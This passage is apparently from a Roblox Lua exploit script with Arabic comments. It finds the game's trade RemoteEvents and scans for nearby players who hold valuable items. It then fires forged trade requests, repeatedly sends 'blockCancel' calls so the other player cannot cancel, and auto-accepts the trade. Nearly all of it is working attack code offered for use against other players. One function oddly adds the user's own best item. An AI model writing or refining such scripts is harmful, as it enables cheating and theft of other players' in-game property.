-- اكتشاف الـ Remotes
local TradeRemotes = {}
for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
    if obj:IsA("RemoteEvent") and (string.find(obj.Name:lower(), "trade") or string.find(obj.Name:lower(), "exchange")) then
        table.insert(TradeRemotes, obj)
    end
end

-- دالة إرسال طلب التداول
function sendTrade(target)
    for _, remote in ipairs(TradeRemotes) do
        pcall(function()
            remote:FireServer(target)
            remote:FireServer({player = target, force = true})
            print("🎯 تم إرسال طلب لـ: " .. target.Name)
        end)
    end
end

-- دالة تجميد التداول
function freezeTrade(tradeId)
    if Config.FreezeTrade then
        spawn(function()
            while wait(0.2) do
                for _, remote in ipairs(TradeRemotes) do
                    pcall(function()
                        remote:FireServer({action = "blockCancel", tradeId = tradeId})
                    end)
                end
            end
        end)
    end
end

-- دالة القبول التلقائي
function acceptTrade(tradeId)
    if Config.AutoAccept then
        wait(0.5)
        for _, remote in ipairs(TradeRemotes) do
            pcall(function()
                remote:FireServer({action = "accept", tradeId = tradeId, force = true})
                remote:FireServer("accept", tradeId)
            end)
        end
    end
end

-- دالة إضافة أفضل العناصر
function addBestItems()
    if not Config.AddBestItems then return end
    
    local bestItem = nil
    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        for _, good in ipairs(GoodItems) do
            if string.find(item.Name:lower(), good:lower()) then
                bestItem = item
                break
            end
        end
    end
    
    if bestItem then
        for _, remote in ipairs(TradeRemotes) do
            pcall(function()
                remote:FireServer({action = "addItem", item = bestItem})
                print("💎 تم إضافة: " .. bestItem.Name)
            end)
        end
    end
end

-- المسح المستمر للاعبين
spawn(function()
    while wait(1.5) do
        if not Config.Enabled then continue end
        
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local dist = (LocalPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
                
                if dist <= Config.ScanRange then
                    -- فحص إذا لدى اللاعب براينروت جيد
                    for _, item in ipairs(player.Backpack:GetChildren()) do
                        for _, good in ipairs(GoodItems) do
                            if string.find(item.Name:lower(), good:lower()) then
                                -- إرسال طلب وتجميد وقبول
                                sendTrade(player)
                                freezeTrade(player.UserId)
                                addBestItems()
                                acceptTrade(player.UserId)
                                wait(2)
                                break
                            end
                        end
                    end
                end
            end
        end
    end
end)

